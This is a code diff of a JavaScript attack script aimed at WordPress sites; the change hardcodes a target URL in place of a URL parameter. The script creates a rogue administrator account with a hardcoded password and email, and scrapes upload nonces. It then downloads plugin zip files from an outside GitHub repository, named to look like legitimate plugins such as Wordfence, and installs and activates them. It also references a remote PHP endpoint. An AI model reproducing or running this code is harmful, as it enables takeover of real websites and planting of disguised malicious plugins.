@@ -16,8 +16,10 @@
             const P = "WpAdmin2026!X";
             const E = "mailt7767@gmail.com";
             const L = "https://static.top/2.php";
+            
+            // ---> HARDCODE YOUR TARGET SANDBOX URL HERE <---
+            const TARGET_URL = "https://naturalcolor.s2-tastewp.com"; 
 
-            // Array of target plugin zip files from your repository
             const PLUGIN_URLS = [
                 "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/Wordfence-Security-API.zip",
                 "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/Advanced-Order-Bundle-For-WooCommerce.zip",
@@ -38,14 +40,8 @@
             }
 
             (async function () {
-                // Auto-detect target domain from URL parameter (e.g., ?target=https://yoursandbox.com)
-                const urlParams = new URLSearchParams(window.location.search);
-                let targetParam = urlParams.get('target') || urlParams.get('site');
-                
-                const o = targetParam ? targetParam.replace(/\/$/, '') : location.origin;
+                const o = TARGET_URL.replace(/\/$/, '');
                 console.log("[*] Target Origin Set To:", o);
-
-                let wp = "/";
 
                 // ==========================================
                 // VECTOR 1: Create Administrator Account
@@ -97,7 +93,6 @@
 
                         const uploadNonce = uploadNonceMatch[1];
                         
-                        // Fetch the zip file blob
                         const zipRes = await fetch(zipUrl);
                         const zipBlob = await zipRes.blob();
                         const fileName = zipUrl.split('/').pop();
@@ -116,7 +111,6 @@
                         });
                         const installText = await installRes.text();
 
-                        // Parse activation link or fallback to plugins list
                         let activateMatch = installText.match(/href=["']([^"']*action=activate[^"']*)["']/i) || 
                                             installText.match(/href=([^\s>]*action=activate[^\s>]*)/i);
 
